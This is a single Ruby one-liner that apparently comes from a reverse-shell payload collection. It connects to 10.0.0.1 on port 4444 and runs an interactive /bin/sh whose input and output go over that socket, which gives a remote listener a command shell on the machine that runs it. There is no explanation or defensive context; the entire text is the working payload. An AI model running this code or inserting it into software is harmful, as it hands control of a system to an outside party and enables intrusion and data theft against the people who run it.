require "socket";s=TCPSocket.new("10.0.0.1",4444);exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s.fileno,s.fileno,s.fileno)
